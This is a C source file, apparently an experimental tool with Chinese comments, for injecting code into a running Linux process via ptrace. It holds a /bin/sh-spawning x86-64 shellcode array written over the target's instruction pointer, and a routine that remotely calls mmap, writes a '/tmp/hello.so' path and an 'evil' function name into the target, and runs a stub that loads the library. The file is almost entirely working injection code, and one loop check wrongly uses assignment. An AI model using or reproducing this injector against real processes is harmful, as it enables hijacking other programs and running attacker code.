

#include <stdlib.h>

#include "utils.h"
unsigned char shellcode[] = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69"
                             "\x6e\x2f\x2f\x73\x68\x57\x48\x89"
                             "\xe7\xb0\x3b\x0f\x05"; // 网络上找的Getshell代码
#define REMOTE_ADDR( addr, local_base, remote_base ) ( addr + remote_base -local_base) 
// 测试程序GetShell
int Test_Inject(pid_t target_pid){
	struct user_regs_struct regs, original_regs;

	if ( ptrace_attach( target_pid ) == -1 ){

		printf("attach\n" );
		return -1;
	}

	printf ("+ Waiting for process...\n");
    //wait (NULL);
    printf ("+ Getting Registers\n");


	if ( ptrace_getregs( target_pid, &regs ) == -1 ){
		printf("- Getregs Error\n" );
		return -1;
	}
    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
	int SHELLCODE_SIZE = sizeof(shellcode);
	printf("+ SHELLCODE size = %d\n",SHELLCODE_SIZE);
	if(ptrace_writedata( target_pid, (void *)regs.rip, (uint8_t *)&shellcode, SHELLCODE_SIZE )==-1){
		printf("- Writedata Error\n" );
		return -1;
	}

	printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
	if ( ptrace_setregs( target_pid, &regs ) == -1 
        || ptrace_continue( target_pid ) == -1 )
    {
    	printf("- Run it Error\n" );
        return -1;
    }
    printf ("+ Run it!\n");
}

int Test_Inject_and_Call_Function(pid_t target_pid){
	struct user_regs_struct regs, original_regs;

	if ( ptrace_attach( target_pid ) == -1 ){

		printf("attach\n" );
		return -1;
	}

	printf ("+ Waiting for process...\n");
    //wait (NULL);
    printf ("+ Getting Registers\n");


	if ( ptrace_getregs( target_pid, &regs ) == -1 ){
		printf("- Getregs Error\n" );
		return -1;
	}
    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);

    void* libc_moudle_base = NULL;
	void* mmap_addr = NULL;
	libc_moudle_base = get_module_base(-1,"/usr/lib/x86_64-linux-gnu/libc-2.32.so");
	printf("+ self libc moudle base:%p\n",libc_moudle_base);

	mmap_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/libc-2.32.so", (void *)mmap );

	printf("+ remote mmap addr:%p\n",mmap_addr);
	long parameters[10];
	parameters[0] = 0;	// addr
	parameters[1] = 0x4000; // size
	parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
	parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
	parameters[4] = 0; //fd
	parameters[5] = 0; //offset



	if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
		printf("- Writedata Error\n" );
		return -1;
	}
	if ( ptrace_getregs( target_pid, &regs ) == -1 ){
		printf("- Getregs Error\n" );
		return -1;
	}

	printf("+ mmap:%p\n",regs.rax);


}

void Test_Get_Moudle_Base(pid_t target_pid){

	void* libc_moudle_base = NULL;
	void* mmap_addr = NULL;
	libc_moudle_base = get_module_base(-1,"/usr/lib/x86_64-linux-gnu/libc-2.32.so");
	printf("self libc moudle base:%p\n",libc_moudle_base);

	mmap_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/libc-2.32.so", (void *)mmap );

	printf("remote mmap addr:%p\n",mmap_addr);

}


int Test_Inject_Shellcode(pid_t target_pid){
	struct user_regs_struct regs, original_regs;
	void *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr,*printf_addr,*pause_addr;
	uint8_t *dlopen_param1_ptr, *dlsym_param2_ptr, *inject_param_ptr, *remote_code_ptr, *local_code_ptr;

	extern uint64_t _dlopen_addr_s, _dlopen_param1_s, _dlopen_param2_s, _dlsym_addr_s, \
			_dlsym_param2_s, _dlclose_addr_s, _inject_start_s, _inject_end_s;
	
	uint32_t code_length;
	char evilFunction[] = "hello";
	char evilSoPath[] = "/tmp/hello.so";

	if ( ptrace_attach( target_pid ) == -1 ){

		printf("attach\n" );
		return -1;
	}

	printf ("+ Waiting for process...\n");
    //wait (NULL);
    printf ("+ Getting Registers\n");


	if ( ptrace_getregs( target_pid, &regs ) == -1 ){
		printf("- Getregs Error\n" );
		return -1;
	}
	memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);

    void* libc_moudle_base = NULL;
	libc_moudle_base = get_module_base(-1,"/usr/lib/x86_64-linux-gnu/libc-2.32.so");
	printf("+ self libc moudle base:%p\n",libc_moudle_base);

	mmap_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/libc-2.32.so", (void *)mmap );
	printf_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/libc-2.32.so", (void *)printf );
	pause_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/libc-2.32.so", (void *)pause );
	printf("+ remote mmap addr:%p\n",mmap_addr);
	printf("+ remote pause addr:%p\n",pause_addr);
	printf("+ remote printf addr:%p\n",printf_addr);
	long parameters[10];
	parameters[0] = 0;	// addr
	parameters[1] = 0x4000; // size
	parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
	parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
	parameters[4] = 0; //fd
	parameters[5] = 0; //offset



	if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
		printf("- Writedata Error\n" );
		return -1;
	}
	if ( ptrace_getregs( target_pid, &regs ) == -1 ){
		printf("- Getregs Error\n" );
		return -1;
	}


	printf("+ mmap:%p\n",regs.rax);


	dlopen_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/ld-2.32.so", (void *)dlopen );
	dlsym_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/ld-2.32.so", (void *)dlsym );
	dlclose_addr = get_remote_addr( target_pid, "/usr/lib/x86_64-linux-gnu/ld-2.32.so", (void *)dlclose );


	printf("dlopen_addr:%p dlsym_addr:%p dlclose_addr:%p\n",dlopen_addr,dlsym_addr,dlclose_addr);
	
	
	remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址


	// 填充函数
	// call 偏移 = 远程地址-(代码段基址+代码段偏移)-5
	// 代码段偏移 =  本地代码段基址-本地代码段偏移
	



	ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);

	//_dlopen_param1_s = (long)remote_code_ptr;//写入了数据之后，这里就不再是代码段开头了，而是储存字符串参数的地方
	memcpy((void*)((long)&_dlopen_param1_s+2),&remote_code_ptr,sizeof(long));

	printf("%p\n",&_dlopen_param1_s);


	printf("+ Writing EvilSo Path at:%p\n",remote_code_ptr);

	// 因为ptrace写入只能4个4个写入如果刚好超过余1就得+4，至于+5是补齐字符串后面的那个\0，上面的+1同理
	remote_code_ptr += strlen(evilSoPath)+5; 


	ptrace_writedata(target_pid,remote_code_ptr,evilFunction,strlen(evilFunction)+1);



	//_dlsym_param2_s = (long)remote_code_ptr;//写入了数据之后，这里就不再是代码段开头了，而是储存字符串参数的地方
	memcpy((void*)((long)&_dlsym_param2_s+2),&remote_code_ptr,sizeof(long));
	printf("+ Writing EvilSo Function Name at:%p\n",_dlsym_param2_s);
	
	remote_code_ptr += strlen(evilFunction)+5; 
	// 填充0x1122334455667788
	memcpy((void*)((long)&_dlopen_addr_s+2),&dlopen_addr,sizeof(long));
	memcpy((void*)((long)&_dlsym_addr_s+2),&dlsym_addr,sizeof(long));
	memcpy((void*)((long)&_dlclose_addr_s+2),&dlclose_addr,sizeof(long));



	//_dlopen_addr_s = (long)dlopen_addr;
	//_dlsym_addr_s = (long)dlsym_addr;
	//_debug_sign_s = (uint64_t)pause_addr;
	local_code_ptr = (uint8_t *)&_inject_start_s;
	code_length = (long)&_inject_end_s - (long)&_inject_start_s;

	ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
	printf("+ Writing Shellcode at:%p code length:%d\n",remote_code_ptr,code_length);
	regs.rip = (long)remote_code_ptr;



	ptrace_setregs( target_pid, &regs );
	ptrace_continue( target_pid );
	printf("+ Waiting....\n");
	waitpid( target_pid, NULL, WUNTRACED  );

	while(1){
		if ( ptrace_getregs( target_pid, &regs ) == -1 ){
			printf("- Getregs Error\n" );
			return -1;
		}
		sleep(1);
		printf("- Now rbx is :%p\n",regs.rbx);
		if(regs.rbx=1234){
			break;//判断执行完so的内容了，开始还原
		}

	}
	printf("+ EvilSo Injected.\n+ Recorver the regsing...\n");
	ptrace_setregs( target_pid, &original_regs );
	ptrace_continue( target_pid );





}

int main(int argc, char const *argv[])
{

	pid_t                   target_pid;
	target_pid = atoi (argv[1]);
	
	// 测试程序GetShell
	//int Test_Inject(target_pid){
	
	//Test_Get_Moudle_Base(target_pid);

	//Test_Inject_and_Call_Function(target_pid);

	Test_Inject_Shellcode(target_pid);

	return 0;
}